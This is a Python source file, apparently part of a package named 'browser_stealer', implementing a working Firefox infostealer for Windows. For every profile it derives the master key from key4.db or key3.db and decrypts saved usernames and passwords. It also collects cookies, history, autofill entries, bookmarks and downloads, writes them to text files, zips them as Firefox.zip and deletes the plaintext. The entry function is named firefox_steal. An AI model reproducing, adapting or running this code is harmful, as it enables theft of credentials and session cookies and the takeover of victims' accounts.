from .browser_stealer import Utils
import sqlite3
from base64 import b64decode
import json
import os
from struct import unpack
from binascii import hexlify, unhexlify 
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
import hmac
from Crypto.Cipher import DES3, AES
from Crypto.Util.number import long_to_bytes
from Crypto.Util.Padding import unpad
import configparser
import shutil


class Firefox:
    def __init__(self, directory: str, master_password: bytes | None=b"") -> (None):
        """
        Create new instance of this class whit target profile directory and master password (if set and available...)
        Use get_key method to return encryption key and get_algo method to return encryption algorithm
        """

        self.dir = directory
        self.master_password = master_password

        #minimal "ASN1 to string" function for displaying Key3.db and key4.db contents
        self.asn1_types = { 0x30: "SEQUENCE", 4: "OCTETSTRING", 6: "OBJECTIDENTIFIER", 2: "INTEGER", 5: "NULL" }

        #http://oid-info.com/get/1.2.840.113549.2.9
        self.oid_values = { 
            b"2a864886f70d010c050103": "1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC",
            b"2a864886f70d0307": "1.2.840.113549.3.7 des-ede3-cbc",
            b"2a864886f70d010101": "1.2.840.113549.1.1.1 pkcs-1",
            b"2a864886f70d01050d": "1.2.840.113549.1.5.13 pkcs5 pbes2", 
            b"2a864886f70d01050c": "1.2.840.113549.1.5.12 pkcs5 PBKDF2",
            b"2a864886f70d0209": "1.2.840.113549.2.9 hmacWithSHA256",
            b"60864801650304012a": "2.16.840.1.101.3.4.1.42 aes256-CBC"
        }

        self.CKA_ID = unhexlify("f8000000000000000000000000000001")


        self.key, self.algo = self.fetch_key(directory=self.dir, master_password=self.master_password)



    def get_key(self) -> (bytes | None):
        return self.key if self.key else None

    def get_algo(self) -> (str | None):
        return self.algo if self.algo else None



    def getShortLE(self, d, a):
        return unpack("<H", (d)[a: a + 2])[0]

    def getLongBE(self, d, a):
        return unpack(">L", (d)[a: a + 4])[0]

    #extract records from a BSD DB 1.85, hash mode 
    #obsolete with Firefox 58.0.2 and NSS 3.35, as key4.db (SQLite) is used
    def read_bsd_db(self, name: str) -> (dict | None):   
        f = open(name, "rb")

        #http://download.oracle.com/berkeley-db/db.1.85.tar.gz
        header = f.read(4 * 15)
        magic = self.getLongBE(header, 0)
        if magic != 0x61561:
            #print("bad magic number")
            #sys.exit()
            return None

        version = self.getLongBE(header,4)
        if version != 2:
            #print("bad version, !=2 (1.85)")
            #sys.exit()
            return None
        
        page_size = self.getLongBE(header, 12)
        nkeys = self.getLongBE(header, 0x38) 

        #print ("pagesize=0x%x" % pagesize)
        #print ("nkeys=%d" % nkeys)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []

        while (readkeys < nkeys):
            f.seek(page_size * page)
            offsets = f.read((nkeys + 1) * 4 + 2)

            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0

            while nval != val:
                keys += 1
                key = self.getShortLE(offsets, 2 + i)
                val = self.getShortLE(offsets, 4 + i)
                nval = self.getShortLE(offsets, 8 + i)
                #print("key=0x%x, val=0x%x" % (key, val))
                offsetVals.append(key + page_size * page)
                offsetVals.append(val + page_size * page)  
                readkeys += 1
                i += 4

            offsetVals.append(page_size * (page + 1))
            valKey = sorted(offsetVals)

            for i in range(keys * 2):
                #print "%x %x" % (valKey[i], valKey[i+1])
                f.seek(valKey[i])
                data = f.read(valKey[i + 1] - valKey[i])
                db1.append(data)

            page += 1
        #print("offset=0x%x" % (page * page_size))

        f.close()

        db = {}
        for i in range(0, len(db1), 2):
            db[db1[i + 1]] = db1[i]

        #for i in db:
        #    print("%s: %s" % ( repr(i), hexlify(db[i]) ))
        
        return db  



    def decrypt_moz3DES(self, globalSalt, entrySalt, encrypted_data, master_password: bytes | None=b"") -> ():
        #see http://www.drh-consultancy.demon.co.uk/key3.html
        hp = sha1(globalSalt + master_password).digest()
        pes = entrySalt + b"\x00" * (20 - len(entrySalt))
        chp = sha1(hp + entrySalt).digest()
        k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
        k = k1 + k2
        iv = k[-8:]
        key = k[:24]

        #print("key= %s, iv=%s" % ( hexlify(key), hexlify(iv) ) )

        #print(type(DES3.new(key, DES3.MODE_CBC, iv).decrypt(encrypted_data)))

        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encrypted_data)



    def extract_secret_key(self, keyData: dict, master_password: bytes | None=b"") -> (bytes | None): #3DES
        #see http://www.drh-consultancy.demon.co.uk/key3.html
        pwdCheck = keyData[b"password-check"]
        entrySaltLen = pwdCheck[1]
        entrySalt = pwdCheck[3:3 + entrySaltLen]
        encryptedPasswd = pwdCheck[-16:]
        globalSalt = keyData[b"global-salt"]

        #print("password-check=%s"% hexlify(pwdCheck))
        #print("entrySalt=%s" % hexlify(entrySalt))
        #print("globalSalt=%s" % hexlify(globalSalt))

        cleartextData = self.decrypt_moz3DES(globalSalt, entrySalt, encryptedPasswd, master_password=master_password)
        if cleartextData != b"password-check\x02\x02":
            return None
            #print("password check error, Master Password is certainly used, please provide it with -p option")
            #sys.exit()

        if self.CKA_ID not in keyData:
            return None
        
        privKeyEntry = keyData[self.CKA_ID]
        saltLen = privKeyEntry[1]
        nameLen = privKeyEntry[2]
        #print "saltLen=%d nameLen=%d" % (saltLen, nameLen)
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3 + saltLen + nameLen:])
        data = privKeyEntry[3 + saltLen + nameLen:]
        #printASN1(data, len(data), 0)
        #see https://github.com/philsmd/pswRecovery4Moz/blob/master/pswRecovery4Moz.txt
        """
        SEQUENCE {
        SEQUENCE {
            OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
            SEQUENCE {
            OCTETSTRING entrySalt
            INTEGER 01
            }
        }
        OCTETSTRING privKeyData
        }
        """
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decrypt_moz3DES(globalSalt, entrySalt, privKeyData, master_password=master_password)

        #print("decrypting privKeyData")
        #print("entrySalt=%s" % hexlify(entrySalt))
        #print("privKeyData=%s" % hexlify(privKeyData))
        #print("decrypted=%s" % hexlify(privKey))
        #printASN1(privKey, len(privKey), 0)
        """
        SEQUENCE {
        INTEGER 00
        SEQUENCE {
            OBJECTIDENTIFIER 1.2.840.113549.1.1.1 pkcs-1
            NULL 0
        }
        OCTETSTRING prKey seq
        }
        """ 
        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()

        #print("decoding %s" % hexlify(prKey))
        #printASN1(prKey, len(prKey), 0)
        """
        SEQUENCE {
        INTEGER 00
        INTEGER 00f8000000000000000000000000000001
        INTEGER 00
        INTEGER 3DES_private_key
        INTEGER 00
        INTEGER 00
        INTEGER 00
        INTEGER 00
        INTEGER 15
        }
        """

        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])

        #print("key=%s" % ( hexlify(key)))
        return key



    def PBE_decrypt(self, item: tuple | list, salt: bytes, master_password: bytes | None=b"") -> (bytes, str):
        algo = str(item[0][0][0])


        if algo == "1.2.840.113549.1.12.5.1.3": #pbeWithSha1AndTripleDES-CBC
            entrySalt = item[0][0][1][0].asOctets()
            cipher_text = item[0][1].asOctets()

            #print("entrySalt:", hexlify(entrySalt))
            key = self.decrypt_moz3DES(salt, entrySalt, cipher_text, master_password="") #masterPassword  #!this
            #print(hexlify(key))

            return (key[:24], algo)
        

        elif algo == "1.2.840.113549.1.5.13": #pkcs5 pbes2  
            #https://phabricator.services.mozilla.com/rNSSfc636973ad06392d11597620b602779b4af312f6

            #assert str(item[0][0][1][0][0]) == "1.2.840.113549.1.5.12"
            #assert str(item[0][0][1][0][1][3][0]) == "1.2.840.113549.2.9"
            #assert str(item[0][0][1][1][0]) == "2.16.840.1.101.3.4.1.42"
            # https://tools.ietf.org/html/rfc8018#page-23
            entrySalt = item[0][0][1][0][1][0].asOctets()
            iterationCount = int(item[0][0][1][0][1][1])
            keyLength = int(item[0][0][1][0][1][2])
            #assert keyLength == 32 

            k = sha1(salt).digest()
            key = pbkdf2_hmac("sha256", k, entrySalt, iterationCount, dklen=keyLength)    

            iv = b"\x04\x0e" + item[0][0][1][1][1].asOctets() #https://hg.mozilla.org/projects/nss/rev/fc636973ad06392d11597620b602779b4af312f6#l6.49
            # 04 is OCTETSTRING, 0x0e is length == 14
            cipher_text = item[0][1].asOctets()
            plain_text = AES.new(key, AES.MODE_CBC, iv).decrypt(cipher_text)
            
            #print("clearText", hexlify(clearText))

            return (plain_text, algo)



    def fetch_key(self, directory: str, master_password: bytes | None=b"") -> (bytes, str):  
        if os.path.isfile(os.path.join(directory, "key4.db")): #os.path.join(directory, "key4.db")   directory / "key4.db"
            #print("found key4.db")
            conn = sqlite3.connect(os.path.join(directory, "key4.db")) # os.path.join(directory, "key4.db")   directory / "key4.db"  #firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
            cursor = conn.cursor()
            cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")

            row = cursor.fetchone()

            globalSalt = row[0] #item1
            #print("globalSalt:", hexlify(globalSalt))
            item2 = row[1]
            #printASN1(item2, len(item2), 0)

            decodedItem2 = decoder.decode(item2) 
            plan_text, algo = self.PBE_decrypt(decodedItem2, globalSalt, master_password=master_password)

            #print(plan_text, algo)
        
            #print("password check?", clearText==b"password-check\x02\x02")
            
            if plan_text == b"password-check\x02\x02": 
                cursor.execute("SELECT a11, a102 FROM nssPrivate")

                for row in cursor:
                    if row[0] != None:
                        break

                a11 = row[0] #CKA_VALUE
                a102 = row[1] 

                if a102 == self.CKA_ID: 
                    ##printASN1(a11, len(a11), 0)
                    decoded_a11 = decoder.decode(a11)
                    #decrypt master key
                    plan_text, algo = self.PBE_decrypt(decoded_a11, globalSalt, master_password=master_password)

                    return (plan_text[:24], algo)
                #else:
                #    print("no saved login/password")      
                return (None, None)
            
            elif os.path.isfile(os.path.join(directory, "key3.db")): #os.path.join(directory, "key3.db")  #directory / "key3.db"
                #print("found key3.db")

                keyData = self.read_bsd_db(os.path.join(directory, "key3.db"))      #!this
                key = self.extract_secret_key(keyData, master_password=master_password)         #!this
                return (key, "1.2.840.113549.1.12.5.1.3")
            else:
                #print("cannot find key4.db nor key3.db")  
                return (None, None)



class FirefoxUtils:
    def __init__(self, dir) -> (None):
        self.dir = dir


    def fetch_profiles(self, path: str="") -> (list, list):
        if path == "": path = self.dir

        config = configparser.ConfigParser()
        config.read(path)

        sections = config.sections()

        profiles = []
        installs = []

        for section in sections:
            if section.startswith("Install"):
                try:
                    default_profile = config.get(section, "Default")
                except: 
                    continue

                installs.append((section.strip("Install"), default_profile))
                continue

            if section.startswith("Profile"):
                try:
                    name = config.get(section, "Name")
                    path = config.get(section, "Path")
                    is_relative = True if config.get(section, "IsRelative") == "1" else False
                except: 
                    continue

                profiles.append((name, is_relative, path))
                continue    
        
        return (profiles, installs)



class FirefoxData:
    def __init__(self, dir) -> (None):
        """
        Create new instance of this class whit target profile directory, each method when called can be called whit 
        explicitly defined profile directory
        """
        self.dir = dir
        self.utils = Utils()

        #global directory
        #directory = dir


    def decode_data(self, data: str) -> (bytes, bytes, bytes):
        asn1data = decoder.decode(b64decode(data)) #first base64 decoding, then ASN1DERdecode
        key_id = asn1data[0][0].asOctets()
        iv = asn1data[0][1][1].asOctets()
        cipher_text = asn1data[0][2].asOctets()

        return (key_id, iv, cipher_text)

    ## 
    ## Passwords
    ## 

    def fetch_passwords(self, dir: str="") -> list:
        if dir == "": dir = self.dir

        logins = []
        db_file = os.path.join(dir, "signons.sqlite")
        json_file = os.path.join(dir, "logins.json")

        if os.path.isfile(json_file): #since Firefox 32, json is used instead of sqlite3
            with open(json_file, "r") as f:
                json_logins = json.loads(f.read())
                
                if "logins" not in json_logins:
                    #print ("error: no \"logins\" key in logins.json")
                    return []
                
                for row in json_logins["logins"]:
                    encrypted_username = row["encryptedUsername"]
                    encrypted_password = row["encryptedPassword"]
                    logins.append((self.decode_data(encrypted_username), self.decode_data(encrypted_password), row["hostname"], row["timeCreated"], row["timeLastUsed"], row["timesUsed"]))
            
            return logins  
        elif os.path.isfile(db_file): #firefox < 32
            #print("sqlite")
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM moz_logins")

            for row in cursor:
                encrypted_username = row[6]
                encrypted_password = row[7]

                #print(row[1], encrypted_username, encrypted_password)
                logins.append((self.decode_data(encrypted_username), self.decode_data(encrypted_password), row[1]))

            return logins
        else: 
            return None

    ##
    ## Cookies
    ##

    def fetch_cookies(self, dir: str="") -> (list):
        if dir == "": dir = self.dir

        try:
            shutil.copyfile(os.path.join(dir, "cookies.sqlite"), "cookies.db")
            
            conn = sqlite3.connect("cookies.db")
            query = "SELECT name, value, host, path, isSecure, isHttpOnly, expiry, lastAccessed, creationTime FROM moz_cookies"
            cursor = conn.execute(query)
        except Exception as e:
            print(e)
            return

        cookies = []
        for row in cursor:
            cookies.append(row)
            #name, value, host, path, is_secure, is_http_only, expiry, last_accessed, creation_time = row
            
            #autofill = f"\nName: {name}\nValue: {value}\nHost: {host}\nPath: {path}\nIs Secure: {is_secure}\nIs http only: {is_http_only}\nExpiry: {expiry}\n"
            #self.utils.store_data(autofill)
        conn.close()
        self.utils.delete_file("cookies.db")

        return cookies

    ## 
    ## History
    ## 

    def fetch_history(self, dir: str="") -> (list):
        if dir == "": dir = self.dir

        try:
            shutil.copyfile(os.path.join(dir, "places.sqlite"), "places.db")
            
            conn = sqlite3.connect("places.db")
            query = "SELECT url, title, visit_count, last_visit_date FROM moz_places"
            cursor = conn.execute(query)
        except Exception as e:
            print(e)
            return

        history = []
        for row in cursor:
            history.append(row)
            #name, value, host, path, is_secure, is_http_only, expiry, last_accessed, creation_time = row
            
            #autofill = f"\nName: {name}\nValue: {value}\nHost: {host}\nPath: {path}\nIs Secure: {is_secure}\nIs http only: {is_http_only}\nExpiry: {expiry}\n"
            #self.utils.store_data(autofill)
        conn.close()
        self.utils.delete_file("places.db")

        return history

    ## 
    ## Autofill
    ## 

    def fetch_autofill(self, dir: str="") -> (list):
        if dir == "": dir = self.dir

        try:
            shutil.copyfile(os.path.join(dir, "formhistory.sqlite"), "autofill.db")
            
            conn = sqlite3.connect("autofill.db")
            query = "SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory"
            cursor = conn.execute(query)
        except Exception as e:
            print(e)
            return

        autofill = []
        for row in cursor:
            autofill.append(row)
            #name, value, host, path, is_secure, is_http_only, expiry, last_accessed, creation_time = row
            
            #autofill = f"\nName: {name}\nValue: {value}\nHost: {host}\nPath: {path}\nIs Secure: {is_secure}\nIs http only: {is_http_only}\nExpiry: {expiry}\n"
            #self.utils.store_data(autofill)
        conn.close()
        self.utils.delete_file("autofill.db")

        return autofill
    
    ##
    ## Bookmarks
    ##

    def fetch_bookmarks(self, dir: str="") -> (list):
        if dir == "": dir = self.dir

        try:
            shutil.copyfile(os.path.join(dir, "places.sqlite"), "bookmarks.db")
            
            conn = sqlite3.connect("bookmarks.db")
            query = "SELECT title, dateAdded, lastModified FROM moz_bookmarks"
            cursor = conn.execute(query)
        except Exception as e:
            print(e)
            return

        bookmarks = []
        for row in cursor:
            bookmarks.append(row)
            #name, value, host, path, is_secure, is_http_only, expiry, last_accessed, creation_time = row
            
            #autofill = f"\nName: {name}\nValue: {value}\nHost: {host}\nPath: {path}\nIs Secure: {is_secure}\nIs http only: {is_http_only}\nExpiry: {expiry}\n"
            #self.utils.store_data(autofill)
        conn.close()
        self.utils.delete_file("bookmarks.db")

        return bookmarks

    ##
    ## Downloads
    ##

    def fetch_downloads(self, dir: str="") -> (list):
        if dir == "": dir = self.dir

        try:
            shutil.copyfile(os.path.join(dir, "places.sqlite"), "downloads.db")
            
            conn = sqlite3.connect("downloads.db")
            query = "SELECT place_id, anno_attribute_id, content, dateAdded FROM moz_annos"
            cursor = conn.execute(query)
        except Exception as e:
            print(e)
            return

        attributes = []
        downloads = []

        for row in cursor:
            if row[1] == 2:
                attributes.append((row[0], row[2]))
                continue

            if row[1] == 1:
                downloads.append((row[0], row[2], row[3]))
                continue
        

        parsed = []
        for download in downloads:
            id = download[0]
            #attributes
            for attribute in attributes:
                if attribute[0] == id:
                    parsed.append((download[1], json.loads(attribute[1]), download[2]))
                    break
                
            #name, value, host, path, is_secure, is_http_only, expiry, last_accessed, creation_time = row
            
            #autofill = f"\nName: {name}\nValue: {value}\nHost: {host}\nPath: {path}\nIs Secure: {is_secure}\nIs http only: {is_http_only}\nExpiry: {expiry}\n"
            #self.utils.store_data(autofill)
        conn.close()
        self.utils.delete_file("downloads.db")

        return parsed





def firefox_steal():
    """
    Calling this function will create an zip file called "Firefox.zip" if firefox is installed and any data in profiles is found
    """
    utils = Utils()
    profiles = FirefoxUtils(os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Mozilla\Firefox\profiles.ini")).fetch_profiles()


    for profile in profiles[0]:
        profile_path = os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Mozilla\Firefox", profile[2])
        path = profile_path if profile[1] else profile[2]
        #print(path)

        b_st = Firefox(path)

        #print(b_st.get_key())
        #print(b_st.get_algo())

        key = b_st.get_key()
        algo = b_st.get_algo()
        
        ff_data = FirefoxData(path)

        login_data = ff_data.fetch_passwords()
        cookies = ff_data.fetch_cookies()
        history = ff_data.fetch_history()
        autofill = ff_data.fetch_autofill()
        bookmarks = ff_data.fetch_bookmarks()
        downloads = ff_data.fetch_downloads()
        
        for cookie in cookies:
            #name, value, host, path, isSecure, isHttpOnly, expiry, lastAccessed, creationTime
            txt = f"\nName: {cookie[0]}\nValue: {cookie[1]}\nHost: {cookie[2]}\nPath: {cookie[3]}\nIs Secure: {cookie[4]}\nIs http only: {cookie[5]}\nExpiry: {cookie[6]}\nLast accessed: {cookie[7]}\nCreation time: {cookie[8]}\n"
            utils.store_data(file="cookies.txt", data=txt)

        for visited in history:
            #url, title, visit_count, last_visit_date
            txt = f"\nURL: {visited[0]}\nTitle: {visited[1]}\nVisit count: {visited[2]}\nLast visit: {visited[3]}\n"
            utils.store_data(file="history.txt", data=txt)

        for instance in autofill:
            #fieldname, value, timesUsed, firstUsed, lastUsed
            txt = f"\nFieldname: {instance[0]}\nValue: {instance[1]}\nTimes used: {instance[2]}\nFirst used: {instance[3]}\nLast used: {instance[4]}\n"
            utils.store_data(file="autofill.txt", data=txt)

        for bookmark in bookmarks:
            #title, dateAdded, lastModified
            txt = f"\nTitle: {bookmark[0]}\nDate Added: {bookmark[1]}\nLast modified: {bookmark[2]}\n"
            utils.store_data(file="bookmarks.txt", data=txt)

        for download in downloads:
            #path, metadata, dateAdded
            txt = f"\nPath: {download[0]}\nMetadata: {download[1]}\nDate downloaded: {download[2]}\n"
            utils.store_data(file="downloads.txt", data=txt)

        #print(ff_data.fetch_downloads())
        #print(ff_data.fetch_cookies())
        #print(ff_data.fetch_history())
        #print(ff_data.fetch_autofill())
        #print(ff_data.fetch_bookmarks())

        key = b_st.get_key()
        algo = b_st.get_algo()
        login_data = ff_data.fetch_passwords()
    

        if algo != "1.2.840.113549.1.12.5.1.3" and algo != "1.2.840.113549.1.5.13":
            return
        
        for login in login_data:
            data = ""
            #print("#########################")
            #utils.store_data(file="passwords.txt", data="\n#########################\n")

            #print(f"URL: {login[2]}")  #URL
            #utils.store_data(file="passwords.txt", data=f"\nURL: {login[2]}\n")
            data += f"\nURL: {login[2]}"

            iv = login[0][1]
            cipher_text = login[0][2] 
            username = unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(cipher_text), 8).decode()
            data += f"\nUsername: {username}"
            #print(f"Username: {username}") # Username
            #utils.store_data(file="passwords.txt", data=f"\nUsername: {username}\n")

            iv = login[1][1]
            cipher_text = login[1][2] 
            password = unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(cipher_text), 8).decode()
            data += f"\nPassword: {password}"
            #print(f"Password: {password}") # Password
            #utils.store_data(file="passwords.txt", data=f"\nPassword: {password}\n")

            data += f"\nTimes Used: {login[5]}"
            #print(f"Times used: {login[5]}") # Times used
            #utils.store_data(file="passwords.txt", data=f"\nTimes used: {login[5]}\n")

            utils.store_data(file=f"passwords.txt", data=f"{data}\n")
            #utils.store_data(file=f"passwords-{profile[0]}.txt", data=f"{data}\n")


        utils.store_data(file=f"passwords.txt", data=f"\nKEY: {key}\nALGO: {algo}\n")
        #utils.store_data(file=f"passwords-{profile[0]}.txt", data=f"\nKEY: {key}\nALGO: {algo}\n")


        files = ["passwords.txt", "cookies.txt", "history.txt", "bookmarks.txt", "autofill.txt", "downloads.txt"]
        utils.zip("Firefox.zip", files)
        utils.delete_files(files)


